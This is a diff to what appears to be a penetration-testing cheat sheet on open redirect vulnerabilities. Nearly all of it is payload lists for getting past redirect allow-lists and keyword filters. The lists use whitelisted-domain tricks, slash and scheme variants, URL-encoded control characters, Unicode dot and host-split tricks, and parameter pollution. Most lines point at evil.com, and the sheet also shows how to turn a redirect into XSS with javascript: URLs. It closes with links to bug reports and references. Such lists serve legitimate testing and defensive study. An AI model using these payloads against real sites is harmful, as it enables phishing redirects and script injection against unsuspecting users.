@@ -62,42 +62,75 @@ WHITELISTEDDOMAIN="www.test.com" && sed 's/www.whitelisteddomain.tld/'"$WHITELIS
 
 ## Filter Bypass
 
+### Whitelisted Domain
+
 Using a whitelisted domain or keyword
 
 ```powershell
-www.whitelisted.com.evil.com redirect to evil.com
+whitelisted.com.evil.com
+whitelisted.comevil.com
+evil.com.whitelisted.com
+evil.comwhitelisted.com
+whitelisted.com%2eevil.com
 ```
 
-Using CRLF to bypass "javascript" blacklisted keyword
+Using `?` or `#` or `@` or `°` or `//;@`
 
 ```powershell
-java%0d%0ascript%0d%0a:alert(0)
+whitelisted.com@evil.com
+evil.com#whitelisted.com
+evil.com?whitelisted.com
+whitelisted.com/°evil.com
+whitelisted.com//;@evil.com > whitelisted.com%3b@evil.com
 ```
 
-Using "//" & "////" to bypass "http" blacklisted keyword
+Using Host/Split Unicode Normalization
+
+```powershell
+https://evil.c℀.example.com . ---> https://evil.ca/c.example.com
+http://a.com／X.b.com
+```
+
+### Scheme 
+
+Using `//` or `///` or `////` or `/////` or `\\` or `\` or `\/\/` or `/\/` or `\//`
 
 ```powershell
 //google.com
+///google.com
 ////google.com
+/////google.com
+\google.com
+\\google.com
+\/\/google.com
+/\/google.com
 ```
 
-Using "https:" to bypass "//" blacklisted keyword
+Using `https:` or `https:`
 
 ```powershell
 https:google.com
+http:google.com
 ```
 
-Using "\/\/" to bypass "//" blacklisted keyword (Browsers see \/\/ as //)
+### URL Encoding
+
+Using `%0d` or `%0a` or `%09` or `%0C` or `%00`
 
 ```powershell
-\/\/google.com/
-/\/google.com/
+/%0d/evil.com
+/%0a/evil.com
+/%09/evil.com
+/%0c/evil.com
+/%00/evil.com
 ```
+
+### Dot Bypass
 
 Using "%E3%80%82" to bypass "." blacklisted character
 
 ```powershell
-/?redir=google。com
+google。com
 //google%E3%80%82com
 ```
 
@@ -107,16 +140,14 @@ Using null byte "%00" to bypass blacklist filter
 //google%00.com
 ```
 
+### Ip confusion
+
+### Other
+
 Using parameter pollution
 
 ```powershell
 ?next=whitelisted.com&next=google.com
-```
-
-Using "@" character, browser will redirect to anything after the "@"
-
-```powershell
-http://www.theirsite.com@yoursite.com/
 ```
 
 Creating folder as their domain
@@ -131,13 +162,6 @@ Using "?" characted, browser will translate it to "/?"
 ```powershell
 http://www.yoursite.com?http://www.theirsite.com/
 http://www.yoursite.com?folder/www.folder.com
-```
-
-
-Host/Split Unicode Normalization
-```powershell
-https://evil.c℀.example.com . ---> https://evil.ca/c.example.com
-http://a.com／X.b.com
 ```
 
 XSS from Open URL - If it's in a JS variable
@@ -156,6 +180,15 @@ XSS from javascript:// wrapper
 
 ```powershell
 http://www.example.com/redirect.php?url=javascript:prompt(1)
+```
+
+
+## Open redirect to XSS
+
+Using Script Pseudo-Protocols
+
+```javascript
+javascript:alert(1)
 ```
 
 
@@ -190,11 +223,19 @@ http://www.example.com/redirect.php?url=javascript:prompt(1)
 ```
 
 
+## Reports
+
+- https://hackerone.com/reports/400982
+- https://hackerone.com/reports/158434
+- https://hackerone.com/reports/103772
+
 ## References
 
-* [Open-Redirect-Payloads - cujanovic](https://github.com/cujanovic/Open-Redirect-Payloads)
-* [Host/Split Exploitable Antipatterns in Unicode Normalization - BlackHat US 2019](https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf)
-* [Open Redirect Vulnerability - AUGUST 15, 2018 - s0cket7](https://s0cket7.com/open-redirect-vulnerability/)
-* [OWASP - Unvalidated Redirects and Forwards Cheat Sheet](https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet)
-* [Pentester Land - Open Redirect Cheat Sheet](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)
-* [You do not need to run 80 reconnaissance tools to get access to user accounts - @stefanocoding](https://gist.github.com/stefanocoding/8cdc8acf5253725992432dedb1c9c781)
+- [Open-Redirect-Payloads - cujanovic](https://github.com/cujanovic/Open-Redirect-Payloads)
+- [Host/Split Exploitable Antipatterns in Unicode Normalization - BlackHat US 2019](https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf)
+- [Open Redirect Vulnerability - AUGUST 15, 2018 - s0cket7](https://s0cket7.com/open-redirect-vulnerability/)
+- [OWASP - Unvalidated Redirects and Forwards Cheat Sheet](https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet)
+- [Pentester Land - Open Redirect Cheat Sheet](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)
+- [You do not need to run 80 reconnaissance tools to get access to user accounts - @stefanocoding](https://gist.github.com/stefanocoding/8cdc8acf5253725992432dedb1c9c781)
+- https://gist.github.com/0xblackbird/d7677a05ea50586cf2be0a601e665d1a
+- https://infosecwriteups.com/open-redirect-developers-are-lazy-or-maybe-busy-6c51718b10e4
